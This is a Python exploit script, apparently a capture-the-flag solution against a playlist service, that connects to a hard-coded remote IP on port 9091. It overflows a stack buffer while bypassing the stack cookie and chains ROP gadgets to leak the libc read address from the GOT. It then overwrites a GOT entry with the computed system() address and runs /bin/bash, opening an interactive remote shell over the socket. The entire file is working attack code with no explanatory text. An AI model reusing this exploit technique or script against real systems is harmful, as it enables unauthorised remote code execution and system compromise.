import sys
import socket
import struct
import telnetlib

def ru( s, st):
	z = ''

	while z.endswith(st) == False:
		z += s.recv(1)

	return z

def addentry( s ):
	s.send('1\n')
	ru(s, '\tmusic\t|\t')
	s.send('hello\n')
	ru(s, '\tartist\t|\t')
	s.send('world\n')

	print ru( s, '\tselect\t|\t')


read_2_11_1 = 0xd9760
system_2_11_1 = 0x3b180

## read 000D9490
## system 0003FCD0
def main(): 
	port = 9091
	ip = 'localhost'
	ip = '175.119.158.133'

	s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))

	view_playlist = struct.pack('I', 0x080496F9)
	got_base = struct.pack('I', 0x0804C00C)
	modify_playlist = struct.pack('I', 0x080498B9)

	print ru(s, ': \n')

	### Send the name. This is passed to system later.
	name = "/bin/bash\x00"
	name += '\n'

	s.send( name )

	ru( s, '\tselect\t|\t')

	for i in range(40):
		addentry(s)

	s.send('3\n')
	ru( s, 'select number\t|\t')

	## by sending 0 is subtracts 0x2c from the stack buffer. This allows me to overflow without overwriting the cookie.
	s.send('0\n')

	print ru(s, '\tmusic\t|\t')

	data = struct.pack('I', 0xdeadbeef)
	data += struct.pack('I', 0xcafebabe)
	data += struct.pack('I', 0x08049ACE) #clear out some stuff ## first pc


	s.send(data)

	print ru(s, '\tartist\t|\t')

	### this needs to be the start of where I am writing.
	data = view_playlist
	data += struct.pack('I', 0x08049ACF) ## pop ret to clear it
	data += got_base
	data += modify_playlist
	data += struct.pack('I', 0x08049ACF) 
	data += struct.pack('I', 0x804C038-4) ## setvbuf got it adds 4
	data += struct.pack('I', 0x080485A0) ## call setvbuf plt
	data += struct.pack('I', 0x13371337)
	data += struct.pack('I', 0x804D7A0) ## string bash
	data += 'b'*(0xc8-len(data))
	s.send(data)

	z = ''
	while len(z) < 4637:
		z += s.recv(1)

	st = z.find('| -')

	if st == -1:
		print '[ERROR] Failed to find the value'
		sys.exit()

	st += 2
	end = z.find('|', st)

	print z[st:end]

	read = struct.unpack('I', struct.pack('i', int(z[st:end])))[0]

	print hex(read)

	print ru( s, 'select number\t|\t')

	s.send('1\n')
	print ru(s, '\tmusic\t|\t')

	addr = struct.pack('I', read-(read_2_11_1-system_2_11_1))

	s.send( addr + '\n')

	print ru(s, '\tartist\t|\t')
	s.send('iii')

	z = ''
	while len(z) < 61:
		z += s.recv(1)
		print z
		print len(z)

	print 'w00t'
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()



main()

